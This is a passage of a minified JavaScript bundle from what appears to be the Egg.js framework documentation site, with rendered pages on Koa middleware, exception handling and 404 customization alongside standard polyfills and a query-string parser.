",r.a.createElement("code",null,"Context")," object in one HTTP request(it is ",r.a.createElement("code",null,"this")," in Koa 1, while it is the first parameter for middleware function in Koa 2). We can mount all the related properties in one request to this object. Such as ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-tracer/blob/1.0.0/lib/tracer.js#L12"},"traceId")," that runs through the whole request lifetime (which will be called anywhere afterward) could be mounted. It is more semantic other than request and response."),r.a.createElement("p",null,"At the same time Request and Response are mounted to the Context object. Just like Express, the two objects provide lots of easy ways to help developing. For example:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"get request.query")),r.a.createElement("li",null,r.a.createElement("code",null,"get request.hostname")),r.a.createElement("li",null,r.a.createElement("code",null,"set response.body")),r.a.createElement("li",null,r.a.createElement("code",null,"set response.status"))),r.a.createElement("h3",{id:"exception-handling"},r.a.createElement(l["AnchorLink"],{to:"#exception-handling","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Exception Handling"),r.a.createElement("p",null,"Another enormous advantage for writing asynchronous code in a synchronous way is that it is quite easy to handle the exception. You can catch all the exceptions thrown in the codes followed the convention with ",r.a.createElement("code",null,"try catch"),". We can easily write a customized exception handling middleware."),r.a.createElement(o["a"],{code:"async function onerror(ctx, next) {\n  try {\n    await next();\n  } catch (err) {\n    ctx.app.emit('error', err);\n    ctx.body = 'server error';\n    ctx.status = err.status || 500;\n  }\n}",lang:"js"}),r.a.createElement("p",null,"Putting this middleware before others, you can catch all the exceptions thrown by the synchronous or asynchronous code."),r.a.createElement("h2",{id:"egg-inherits-from-koa"},r.a.createElement(l["AnchorLink"],{to:"#egg-inherits-from-koa","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Egg Inherits from Koa"),r.a.createElement("p",null,"As described above, Koa is an excellent framework. However, it is not enough to build an enterprise-class application."),r.a.createElement("p",null,"Egg is built around the Koa. On the basis of Koa model, Egg implements enhancements one step further."),r.a.createElement("h3",{id:"extension"},r.a.createElement(l["AnchorLink"],{to:"#extension","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Extension"),r.a.createElement("p",null,"In the framework or application based on Egg, we can extend the prototype of 4 Koa objects by defining ",r.a.createElement("code",null,"app/extend/","{","application,context,request,response","}",".js"),". With this, we can write more utility methods quickly. For example, we have the following code in ",r.a.createElement("code",null,"app/extend/context.js"),":"),r.a.createElement(o["a"],{code:"// app/extend/context.js\nmodule.exports = {\n  get isIOS() {\n    const iosReg = /iphone|ipad|ipod/i;\n    return iosReg.test(this.get('user-agent'));\n  },\n};",lang:"js"}),r.a.createElement("p",null,"It can be used in controller then:"),r.a.createElement(o["a"],{code:"// app/controller/home.js\nexports.handler = (ctx) => {\n  ctx.body = ctx.isIOS\n    ? 'Your operating system is iOS.'\n    : 'Your operating system is not iOS.';\n};",lang:"js"}),r.a.createElement("p",null,"More about extension, please check ",r.a.createElement(l["Link"],{to:"../basics/extend"},"Exception")," section."),r.a.createElement("h3",{id:"plugin"},r.a.createElement(l["AnchorLink"],{to:"#plugin","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Plugin"),r.a.createElement("p",null,"As is known to all, Many middlewares are imported to provide different kinds of features in Express and Koa. Eg, ",r.a.createElement(l["Link"],{to:"https://github.com/koajs/session"},"koa-session")," provides the Session support, ",r.a.createElement(l["Link"],{to:"https://github.com/koajs/bodyparser"},"koa-bodyparser")," help to parse request body. Egg has provided a powerful plugin mechanism to make it easier to write stand-alone features."),r.a.createElement("p",null,"One plugin can include:"),r.a.createElement("ul",null,r.a.createElement("li",null,"extend\uff1aextend the context of base object, provide utility and attributes."),r.a.createElement("li",null,"middleware\uff1aadd one or more middlewares, provide pre or post-processing logic for request."),r.a.createElement("li",null,"config\uff1aconfigure the default value in different environments.")),r.a.createElement("p",null,"A stand-alone module plugin can provide rich features with high maintainability. You can almost forget the configuration as the plugin supports configuring the default value in different environments."),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-security"},"egg-security")," is a typical example."),r.a.createElement("p",null,"More about plugin, please check ",r.a.createElement(l["Link"],{to:"../basics/plugin"},"Plugin")," section."),r.a.createElement("h3",{id:"roadmap"},r.a.createElement(l["AnchorLink"],{to:"#roadmap","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Roadmap"),r.a.createElement("h4",{id:"egg-1x"},r.a.createElement(l["AnchorLink"],{to:"#egg-1x","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Egg 1.x"),r.a.createElement("p",null,"When Egg 1.x released, the Node.js LTS version did not support async function\uff0cso Egg 1.x was based on Koa 1.x. On the basis of this, Egg had added fully async function support. Egg is completely compatible with middlewares in Koa 2.x, all applications could write with ",r.a.createElement("code",null,"async function"),"."),r.a.createElement("ul",null,r.a.createElement("li",null,"The underlying is based on Koa 1.x, asynchronous solution is based on the generator function wrapped by ",r.a.createElement(l["Link"],{to:"https://github.com/tj/co"},"co"),"."),r.a.createElement("li",null,"Official plugin and the core of Egg are written in generator function, keep supporting Node.js LTS version, use ",r.a.createElement(l["Link"],{to:"https://github.com/tj/co"},"co")," when necessary to be compatible with async function."),r.a.createElement("li",null,"Application developers can choose either async function (Node.js 8.x+) or generator function (Node.js 6.x+).")),r.a.createElement("h4",{id:"egg-2x"},r.a.createElement(l["AnchorLink"],{to:"#egg-2x","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Egg 2.x"),r.a.createElement("p",null,"When Node.js 8 became LTS version, an async function could be used in Node.js without any performance problem. Egg released 2.x based on Koa 2.x, the framework and built-in plugins were all written by async function, and Egg 2.x still kept compatibility with generator function and all the usages in Egg 1.x, applications based on Egg 1.x can migrate to Egg 2.x only by upgrading to Node.js 8."),r.a.createElement("ul",null,r.a.createElement("li",null,"The underlying will be based on Koa 2.x, the asynchronous solution will be based on async function."),r.a.createElement("li",null,"The official plugin and core of egg will be written in an async function."),r.a.createElement("li",null,"Recommend the user to transfer the business layer to async function."),r.a.createElement("li",null,"Only support Node.js 8+."))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},XAFM:function(e,t,n){"use strict";var a="Function.prototype.bind called on incompatible ",r=Array.prototype.slice,l=Object.prototype.toString,o="[object Function]";e.exports=function(e){var t=this;if("function"!==typeof t||l.call(t)!==o)throw new TypeError(a+t);for(var n,i=r.call(arguments,1),c=function(){if(this instanceof n){var a=t.apply(this,i.concat(r.call(arguments)));return Object(a)===a?a:this}return t.apply(e,i.concat(r.call(arguments)))},s=Math.max(0,t.length-i.length),u=[],d=0;d<s;d++)u.push("$"+d);if(n=Function("binder","return function ("+u.join(",")+"){ return binder.apply(this,arguments); }")(c),t.prototype){var m=function(){};m.prototype=t.prototype,n.prototype=new m,m.prototype=null}return n}},XBXf:function(e,t,n){"use strict";var a=n("G9w8"),r=n("m/os"),l=n("Z3pt"),o=n("wdLt"),i=n("N0Us"),c=n("ESQ9"),s=n("TYe2");e.exports=function(e){var t,n,u,d,m,p,h=r(e),g="function"==typeof this?this:Array,f=arguments.length,E=f>1?arguments[1]:void 0,b=void 0!==E,v=s(h),y=0;if(b&&(E=a(E,f>2?arguments[2]:void 0,2)),void 0==v||g==Array&&o(v))for(t=i(h.length),n=new g(t);t>y;y++)p=b?E(h[y],y):h[y],c(n,y,p);else for(d=v.call(h),m=d.next,n=new g;!(u=m.call(d)).done;y++)p=b?l(d,E,[u.value,y],!0):u.value,c(n,y,p);return n.length=y,n}},XExY:function(e,t,n){var a=n("9Rcy"),r=n("u3TI"),l=n("aGbw");e.exports=a?function(e,t,n){return r.f(e,t,l(1,n))}:function(e,t,n){return e[t]=n,e}},XL89:function(e,t,n){"use strict";n.d(t,"a",(function(){return l}));var a=!0,r="Invariant failed";function l(e,t){if(!e){if(a)throw new Error(r);var n="function"===typeof t?t():t,l=n?"".concat(r,": ").concat(n):r;throw new Error(l)}}},XS8S:function(e,t,n){var a=n("Xdqv");e.exports=!!Object.getOwnPropertySymbols&&!a((function(){return!String(Symbol())}))},XaNN:function(e,t){e.exports=function(e){if("function"!=typeof e)throw TypeError(String(e)+" is not a function");return e}},XccI:function(e,t,n){"use strict";var a=n("oyD1"),r=n("XaNN");e.exports=function(){for(var e,t=a(this),n=r(t["delete"]),l=!0,o=0,i=arguments.length;o<i;o++)e=n.call(t,arguments[o]),l=l&&e;return!!l}},Xdqv:function(e,t){e.exports=function(e){try{return!!e()}catch(t){return!0}}},XejE:function(e,t,n){"use strict";var a=n("m4/z"),r=n("A0UU"),l=n("Xdqv");e.exports=a||!l((function(){var e=Math.random();__defineSetter__.call(null,e,(function(){})),delete r[e]}))},XuDl:function(e,t,n){"use strict";var a=n("0mt+"),r=n("9Rcy"),l=n("A0UU"),o=n("31yA"),i=n("a7jj"),c=n("u3TI").f,s=n("bOLl"),u=l.Symbol;if(r&&"function"==typeof u&&(!("description"in u.prototype)||void 0!==u().description)){var d={},m=function(){var e=arguments.length<1||void 0===arguments[0]?void 0:String(arguments[0]),t=this instanceof m?new u(e):void 0===e?u():u(e);return""===e&&(d[t]=!0),t};s(m,u);var p=m.prototype=u.prototype;p.constructor=m;var h=p.toString,g="Symbol(test)"==String(u("test")),f=/^Symbol\((.*)\)[^)]+$/;c(p,"description",{configurable:!0,get:function(){var e=i(this)?this.valueOf():this,t=h.call(e);if(o(d,e))return"";var n=g?t.slice(7,-1):t.replace(f,"$1");return""===n?void 0:n}}),a({global:!0,forced:!0},{Symbol:m})}},"Y/Tn":function(e,t,n){"use strict";var a=n("j9mU"),r=n("th5x"),l=r("%Function.prototype.apply%"),o=r("%Function.prototype.call%"),i=r("%Reflect.apply%",!0)||a.call(o,l),c=r("%Object.getOwnPropertyDescriptor%",!0),s=r("%Object.defineProperty%",!0),u=r("%Math.max%");if(s)try{s({},"a",{value:1})}catch(m){s=null}e.exports=function(e){var t=i(a,o,arguments);if(c&&s){var n=c(t,"length");n.configurable&&s(t,"length",{value:1+u(0,e.length-(arguments.length-1))})}return t};var d=function(){return i(a,l,arguments)};s?s(e.exports,"apply",{value:d}):e.exports.apply=d},Y6X2:function(e,t,n){"use strict";var a=n("2EJr"),r=n("3Qq0"),l=n("0YMn"),o=n("EJBU"),i=n("FU0I"),c=n.n(i),s=n("VGn1"),u=n.n(s),d=n("0kLB"),m=n("paKd"),p=["prefixCls","invalidate","item","renderItem","responsive","responsiveDisabled","registerSize","itemKey","className","style","children","display","order","component"],h=void 0;function g(e,t){var n=e.prefixCls,l=e.invalidate,c=e.item,s=e.renderItem,m=e.responsive,g=e.responsiveDisabled,f=e.registerSize,E=e.itemKey,b=e.className,v=e.style,y=e.children,k=e.display,w=e.order,x=e.component,j=void 0===x?"div":x,S=Object(o["a"])(e,p),C=m&&!k;function A(e){f(E,e)}i["useEffect"]((function(){return function(){A(null)}}),[]);var L,T=s&&c!==h?s(c):y;l||(L={opacity:C?0:1,height:C?0:h,overflowY:C?"hidden":h,order:m?w:h,pointerEvents:C?"none":h,position:C?"absolute":h});var N={};C&&(N["aria-hidden"]=!0);var O=i["createElement"](j,Object(a["a"])({className:u()(!l&&n,b),style:Object(r["a"])(Object(r["a"])({},L),v)},N,S,{ref:t}),T);return m&&(O=i["createElement"](d["a"],{onResize:function(e){var t=e.offsetWidth;A(t)},disabled:g},O)),O}var f=i["forwardRef"](g);f.displayName="Item";var E=f,b=n("t6MI"),v=n("kqhb"),y=n("WeeI");function k(e){if("undefined"===typeof MessageChannel)Object(y["a"])(e);else{var t=new MessageChannel;t.port1.onmessage=function(){return e()},t.port2.postMessage(void 0)}}function w(){var e=i["useRef"](null),t=function(t){e.current||(e.current=[],k((function(){Object(v["unstable_batchedUpdates"])((function(){e.current.forEach((function(e){e()})),e.current=null}))}))),e.current.push(t)};return t}function x(e,t){var n=i["useState"](t),a=Object(l["a"])(n,2),r=a[0],o=a[1],c=Object(b["a"])((function(t){e((function(){o(t)}))}));return[r,c]}var j=c.a.createContext(null),S=["component"],C=["className"],A=["className"],L=function(e,t){var n=i["useContext"](j);if(!n){var r=e.component,l=void 0===r?"div":r,c=Object(o["a"])(e,S);return i["createElement"](l,Object(a["a"])({},c,{ref:t}))}var s=n.className,d=Object(o["a"])(n,C),m=e.className,p=Object(o["a"])(e,A);return i["createElement"](j.Provider,{value:null},i["createElement"](E,Object(a["a"])({ref:t,className:u()(s,m)},d,p)))},T=i["forwardRef"](L);T.displayName="RawItem";var N=T,O=["prefixCls","data","renderItem","renderRawItem","itemKey","itemWidth","ssr","style","className","maxCount","renderRest","renderRawRest","suffix","component","itemComponent","onVisibleChange"],I="responsive",P="invalidate";function R(e){return"+ ".concat(e.length," ...")}function _(e,t){var n=e.prefixCls,c=void 0===n?"rc-overflow":n,s=e.data,p=void 0===s?[]:s,h=e.renderItem,g=e.renderRawItem,f=e.itemKey,b=e.itemWidth,v=void 0===b?10:b,y=e.ssr,k=e.style,S=e.className,C=e.maxCount,A=e.renderRest,L=e.renderRawRest,T=e.suffix,N=e.component,_=void 0===N?"div":N,q=e.itemComponent,M=e.onVisibleChange,F=Object(o["a"])(e,O),D="full"===y,U=w(),z=x(U,null),H=Object(l["a"])(z,2),B=H[0],W=H[1],V=B||0,$=x(U,new Map),G=Object(l["a"])($,2),X=G[0],Q=G[1],K=x(U,0),J=Object(l["a"])(K,2),Y=J[0],Z=J[1],ee=x(U,0),te=Object(l["a"])(ee,2),ne=te[0],ae=te[1],re=x(U,0),le=Object(l["a"])(re,2),oe=le[0],ie=le[1],ce=Object(i["useState"])(null),se=Object(l["a"])(ce,2),ue=se[0],de=se[1],me=Object(i["useState"])(null),pe=Object(l["a"])(me,2),he=pe[0],ge=pe[1],fe=i["useMemo"]((function(){return null===he&&D?Number.MAX_SAFE_INTEGER:he||0}),[he,B]),Ee=Object(i["useState"])(!1),be=Object(l["a"])(Ee,2),ve=be[0],ye=be[1],ke="".concat(c,"-item"),we=Math.max(Y,ne),xe=C===I,je=p.length&&xe,Se=C===P,Ce=je||"number"===typeof C&&p.length>C,Ae=Object(i["useMemo"])((function(){var e=p;return je?e=null===B&&D?p:p.slice(0,Math.min(p.length,V/v)):"number"===typeof C&&(e=p.slice(0,C)),e}),[p,v,B,C,je]),Le=Object(i["useMemo"])((function(){return je?p.slice(fe+1):p.slice(Ae.length)}),[p,Ae,je,fe]),Te=Object(i["useCallback"])((function(e,t){var n;return"function"===typeof f?f(e):null!==(n=f&&(null===e||void 0===e?void 0:e[f]))&&void 0!==n?n:t}),[f]),Ne=Object(i["useCallback"])(h||function(e){return e},[h]);function Oe(e,t,n){(he!==e||void 0!==t&&t!==ue)&&(ge(e),n||(ye(e<p.length-1),null===M||void 0===M||M(e)),void 0!==t&&de(t))}function Ie(e,t){W(t.clientWidth)}function Pe(e,t){Q((function(n){var a=new Map(n);return null===t?a["delete"](e):a.set(e,t),a}))}function Re(e,t){ae(t),Z(ne)}function _e(e,t){ie(t)}function qe(e){return X.get(Te(Ae[e],e))}Object(m["a"])((function(){if(V&&"number"===typeof we&&Ae){var e=oe,t=Ae.length,n=t-1;if(!t)return void Oe(0,null);for(var a=0;a<t;a+=1){var r=qe(a);if(D&&(r=r||0),void 0===r){Oe(a-1,void 0,!0);break}if(e+=r,0===n&&e<=V||a===n-1&&e+qe(n)<=V){Oe(n,null);break}if(e+we>V){Oe(a-1,e-r-oe+ne);break}}T&&qe(0)+oe>V&&de(null)}}),[V,X,ne,oe,Te,Ae]);var Me=ve&&!!Le.length,Fe={};null!==ue&&je&&(Fe={position:"absolute",left:ue,top:0});var De,Ue={prefixCls:ke,responsive:je,component:q,invalidate:Se},ze=g?function(e,t){var n=Te(e,t);return i["createElement"](j.Provider,{key:n,value:Object(r["a"])(Object(r["a"])({},Ue),{},{order:t,item:e,itemKey:n,registerSize:Pe,display:t<=fe})},g(e,t))}:function(e,t){var n=Te(e,t);return i["createElement"](E,Object(a["a"])({},Ue,{order:t,key:n,item:e,renderItem:Ne,itemKey:n,registerSize:Pe,display:t<=fe}))},He={order:Me?fe:Number.MAX_SAFE_INTEGER,className:"".concat(ke,"-rest"),registerSize:Re,display:Me};if(L)L&&(De=i["createElement"](j.Provider,{value:Object(r["a"])(Object(r["a"])({},Ue),He)},L(Le)));else{var Be=A||R;De=i["createElement"](E,Object(a["a"])({},Ue,He),"function"===typeof Be?Be(Le):Be)}var We=i["createElement"](_,Object(a["a"])({className:u()(!Se&&c,S),style:k,ref:t},F),Ae.map(ze),Ce?De:null,T&&i["createElement"](E,Object(a["a"])({},Ue,{responsive:xe,responsiveDisabled:!je,order:fe,className:"".concat(ke,"-suffix"),registerSize:_e,display:!0,style:Fe}),T));return xe&&(We=i["createElement"](d["a"],{onResize:Ie,disabled:!je},We)),We}var q=i["forwardRef"](_);q.displayName="Overflow",q.Item=N,q.RESPONSIVE=I,q.INVALIDATE=P;var M=q;t["a"]=M},YKhC:function(e,t,n){"use strict";var a=n("8frV"),r=Object.prototype.hasOwnProperty,l=Array.isArray,o={allowDots:!1,allowPrototypes:!1,allowSparse:!1,arrayLimit:20,charset:"utf-8",charsetSentinel:!1,comma:!1,decoder:a.decode,delimiter:"&",depth:5,ignoreQueryPrefix:!1,interpretNumericEntities:!1,parameterLimit:1e3,parseArrays:!0,plainObjects:!1,strictNullHandling:!1},i=function(e){return e.replace(/&#(\d+);/g,(function(e,t){return String.fromCharCode(parseInt(t,10))}))},c=function(e,t){return e&&"string"===typeof e&&t.comma&&e.indexOf(",")>-1?e.split(","):e},s="utf8=%26%2310003%3B",u="utf8=%E2%9C%93",d=function(e,t){var n,d={__proto__:null},m=t.ignoreQueryPrefix?e.replace(/^\?/,""):e,p=t.parameterLimit===1/0?void 0:t.parameterLimit,h=m.split(t.delimiter,p),g=-1,f=t.charset;if(t.charsetSentinel)for(n=0;n<h.length;++n)0===h[n].indexOf("utf8=")&&(h[n]===u?f="utf-8":h[n]===s&&(f="iso-8859-1"),g=n,n=h.length);for(n=0;n<h.length;++n)if(n!==g){var E,b,v=h[n],y=v.indexOf("]="),k=-1===y?v.indexOf("="):y+1;-1===k?(E=t.decoder(v,o.decoder,f,"key"),b=t.strictNullHandling?null:""):(E=t.decoder(v.slice(0,k),o.decoder,f,"key"),b=a.maybeMap(c(v.slice(k+1),t),(function(e){return t.decoder(e,o.decoder,f,"value")}))),b&&t.interpretNumericEntities&&"iso-8859-1"===f&&(b=i(b)),v.indexOf("[]=")>-1&&(b=l(b)?[b]:b),r.call(d,E)?d[E]=a.combine(d[E],b):d[E]=b}return d},m=function(e,t,n,a){for(var r=a?t:c(t,n),l=e.length-1;l>=0;--l){var o,i=e[l];if("[]"===i&&n.parseArrays)o=[].concat(r);else{o=n.plainObjects?Object.create(null):{};var s="["===i.charAt(0)&&"]"===i.charAt(i.length-1)?i.slice(1,-1):i,u=parseInt(s,10);n.parseArrays||""!==s?!isNaN(u)&&i!==s&&String(u)===s&&u>=0&&n.parseArrays&&u<=n.arrayLimit?(o=[],o[u]=r):"__proto__"!==s&&(o[s]=r):o={0:r}}r=o}return r},p=function(e,t,n,a){if(e){var l=n.allowDots?e.replace(/\.([^.[]+)/g,"[$1]"):e,o=/(\[[^[\]]*])/,i=/(\[[^[\]]*])/g,c=n.depth>0&&o.exec(l),s=c?l.slice(0,c.index):l,u=[];if(s){if(!n.plainObjects&&r.call(Object.prototype,s)&&!n.allowPrototypes)return;u.push(s)}var d=0;while(n.depth>0&&null!==(c=i.exec(l))&&d<n.depth){if(d+=1,!n.plainObjects&&r.call(Object.prototype,c[1].slice(1,-1))&&!n.allowPrototypes)return;u.push(c[1])}return c&&u.push("["+l.slice(c.index)+"]"),m(u,t,n,a)}},h=function(e){if(!e)return o;if(null!==e.decoder&&void 0!==e.decoder&&"function"!==typeof e.decoder)throw new TypeError("Decoder has to be a function.");if("undefined"!==typeof e.charset&&"utf-8"!==e.charset&&"iso-8859-1"!==e.charset)throw new TypeError("The charset option must be either utf-8, iso-8859-1, or undefined");var t="undefined"===typeof e.charset?o.charset:e.charset;return{allowDots:"undefined"===typeof e.allowDots?o.allowDots:!!e.allowDots,allowPrototypes:"boolean"===typeof e.allowPrototypes?e.allowPrototypes:o.allowPrototypes,allowSparse:"boolean"===typeof e.allowSparse?e.allowSparse:o.allowSparse,arrayLimit:"number"===typeof e.arrayLimit?e.arrayLimit:o.arrayLimit,charset:t,charsetSentinel:"boolean"===typeof e.charsetSentinel?e.charsetSentinel:o.charsetSentinel,comma:"boolean"===typeof e.comma?e.comma:o.comma,decoder:"function"===typeof e.decoder?e.decoder:o.decoder,delimiter:"string"===typeof e.delimiter||a.isRegExp(e.delimiter)?e.delimiter:o.delimiter,depth:"number"===typeof e.depth||!1===e.depth?+e.depth:o.depth,ignoreQueryPrefix:!0===e.ignoreQueryPrefix,interpretNumericEntities:"boolean"===typeof e.interpretNumericEntities?e.interpretNumericEntities:o.interpretNumericEntities,parameterLimit:"number"===typeof e.parameterLimit?e.parameterLimit:o.parameterLimit,parseArrays:!1!==e.parseArrays,plainObjects:"boolean"===typeof e.plainObjects?e.plainObjects:o.plainObjects,strictNullHandling:"boolean"===typeof e.strictNullHandling?e.strictNullHandling:o.strictNullHandling}};e.exports=function(e,t){var n=h(t);if(""===e||null===e||"undefined"===typeof e)return n.plainObjects?Object.create(null):{};for(var r="string"===typeof e?d(e,n):e,l=n.plainObjects?Object.create(null):{},o=Object.keys(r),i=0;i<o.length;++i){var c=o[i],s=p(c,r[c],n,"string"===typeof e);l=a.merge(l,s,n)}return!0===n.allowSparse?l:a.compact(l)}},YRGx:function(e,t,n){"use strict";var a=n("0mt+"),r=n("Kdrj").charAt;a({target:"String",proto:!0},{at:function(e){return r(this,e)}})},YRQD:function(e,t,n){},YT8d:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=n("3dEy"),c=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("h2",{id:"exception-capture"},r.a.createElement(l["AnchorLink"],{to:"#exception-capture","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Exception Capture"),r.a.createElement("p",null,"Taking benefits from framework asynchronous support, all exceptions can be caught by ",r.a.createElement("code",null,"try catch"),"."),r.a.createElement("p",null,"With those features, you can take following implementation as reference:"),r.a.createElement(o["a"],{code:"// app/service/test.js\ntry {\n  const res = await this.ctx.curl('http://eggjs.com/api/echo', {\n    dataType: 'json',\n  });\n  if (res.status !== 200) throw new Error('response status is not 200');\n  return res.data;\n} catch (err) {\n  this.logger.error(err);\n  return {};\n}",lang:"js"}),r.a.createElement("p",null,"Generally, you can use ",r.a.createElement("code",null,"try catch")," to catch exceptions. However, some implementations may break this mechanism down. Imaging that ",r.a.createElement("code",null,"await")," makes generators run in order just like a chain. What will happen if one of them jumpoff the chain? The following code can help you realize the imagination:"),r.a.createElement(o["a"],{code:"// app/controller/home.js\nclass HomeController extends Controller {\n  async buy() {\n    const request = {};\n    const config = await ctx.service.trade.buy(request);\n    // checking the deal and don't block current request\n    setImmediate(() => {\n      ctx.service.trade.check(request).catch((err) => ctx.logger.error(err));\n    });\n  }\n}",lang:"js"}),r.a.createElement("p",null,"In this case, you may find that the exceptions in ",r.a.createElement("code",null,"setImmediate")," will be swallowed because the scope breaks the chain, although egg already handled exceptions externally."),r.a.createElement("p",null,"Above scene is also considered. To catch the exception inside the scope, You can invoke helper method ",r.a.createElement("code",null,"ctx.runInBackground(scope)")," to wrap the chain back. Now, the exceptions will be detected and caught."),r.a.createElement(o["a"],{code:"class HomeController extends Controller {\n  async buy() {\n    const request = {};\n    const config = await ctx.service.trade.buy(request);\n    // checking the deal and don't block current request\n    ctx.runInBackground(async () => {\n      // Exceptions thrown here will be caught in background and printed into log.\n      await ctx.service.trade.check(request);\n    });\n  }\n}",lang:"js"}),r.a.createElement("p",null,"For convenience of locating problems, exceptions must be guaranteed to be Error object or object based on Error object, which offers a trace of which functions were called."),r.a.createElement("h2",{id:"egg-takes-charge-of-exceptions"},r.a.createElement(l["AnchorLink"],{to:"#egg-takes-charge-of-exceptions","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Egg Takes Charge of Exceptions"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-onerror"},"egg-onerror"),', one of Egg\'s plugin, handles all exceptions thrown in Middleware, Controller and Service, and returns the error as response based on "Accept" in request header field.'),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"Accept"),r.a.createElement("th",null,"ENV"),r.a.createElement("th",null,"errorPageUrl"),r.a.createElement("th",null,"response"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"HTML & TEXT"),r.a.createElement("td",null,"local & unittest"),r.a.createElement("td",null,"-"),r.a.createElement("td",null,"onerror built-in error page")),r.a.createElement("tr",null,r.a.createElement("td",null,"HTML & TEXT"),r.a.createElement("td",null,"others"),r.a.createElement("td",null,"YES"),r.a.createElement("td",null,"redirect to errorPageUrl")),r.a.createElement("tr",null,r.a.createElement("td",null,"HTML & TEXT"),r.a.createElement("td",null,"others"),r.a.createElement("td",null,"NO"),r.a.createElement("td",null,"onerror built-in error page(simple, not recommended)")),r.a.createElement("tr",null,r.a.createElement("td",null,"JSON & JSONP"),r.a.createElement("td",null,"local & unittest"),r.a.createElement("td",null,"-"),r.a.createElement("td",null,"JSON Object or JSONP response body with details")),r.a.createElement("tr",null,r.a.createElement("td",null,"JSON & JSONP"),r.a.createElement("td",null,"others"),r.a.createElement("td",null,"-"),r.a.createElement("td",null,"JSON object or JSONP response body without details")))),r.a.createElement("h3",{id:"errorpageurl"},r.a.createElement(l["AnchorLink"],{to:"#errorpageurl","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"errorPageUrl")),r.a.createElement("p",null,"Redirecting to your customized error page by setting ",r.a.createElement("code",null,"errorPageUrl")," in ",r.a.createElement("code",null,"onerror")," plugin."),r.a.createElement("p",null,r.a.createElement("code",null,"onerror")," config in ",r.a.createElement("code",null,"config/config.default.js"),":"),r.a.createElement(o["a"],{code:"module.exports = {\n  onerror: {\n    errorPageUrl: '/50x.html',\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"create-your-universal-exception-handler"},r.a.createElement(l["AnchorLink"],{to:"#create-your-universal-exception-handler","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Create Your Universal Exception Handler"),r.a.createElement("p",null,"Once the default handler no longer meet your needs, you still can customize your owner error handler by onerror's configurations."),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  onerror: {\n    all(err, ctx) {\n      // Define an error handler for all type of Response.\n      // Once config.all present, other type of error handers will be ignored.\n      ctx.body = 'error';\n      ctx.status = 500;\n    },\n    html(err, ctx) {\n      // html hander\n      ctx.body = '<h3>error</h3>';\n      ctx.status = 500;\n    },\n    json(err, ctx) {\n      // json hander\n      ctx.body = { message: 'error' };\n      ctx.status = 500;\n    },\n    jsonp(err, ctx) {\n      // Generally, we don't need to customize jsonp error handler.\n      // It will call json error handler and wrap to jsonp type response.\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"404"},r.a.createElement(l["AnchorLink"],{to:"#404","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"404"),r.a.createElement("p",null,"Egg won't take ",r.a.createElement("code",null,"NOT FOUND")," from back-end as exception. Instead, if ",r.a.createElement("code",null,"NOT FOUND")," is emitted without a body, it will return the following JSON object as default response."),r.a.createElement("p",null,"identified as JSON:"),r.a.createElement(o["a"],{code:'{\n  "message": "Not Found"\n}',lang:"js"}),r.a.createElement("p",null,"identified as HTML:"),r.a.createElement(o["a"],{code:"<h1>404 Not Found</h1>",lang:"html"}),r.a.createElement("p",null,"Overriding default 404 page to the one you want:"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  notfound: {\n    pageUrl: '/404.html',\n  },\n};",lang:"js"}),r.a.createElement("h3",{id:"customize-404-response"},r.a.createElement(l["AnchorLink"],{to:"#customize-404-response","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Customize 404 Response"),r.a.createElement("p",null,"If you want a customized 404 response, you only need to create a middleware to handle it once, just like handling exceptions above."),r.a.createElement(o["a"],{code:"// app/middleware/notfound_handler.js\nmodule.exports = () => {\n  return async function notFoundHandler(ctx, next) {\n    await next();\n    if (ctx.status === 404 && !ctx.body) {\n      if (ctx.acceptJSON) {\n        ctx.body = { error: 'Not Found' };\n      } else {\n        ctx.body = '<h1>Page Not Found</h1>';\n      }\n    }\n  };\n};",lang:"js"}),r.a.createElement("p",null,"Adding yours to ",r.a.createElement("code",null,"middleware")," in config:"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  middleware: ['notfoundHandler'],\n};",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(c,{demos:n})}},YeTV:function(e,t,n){"use 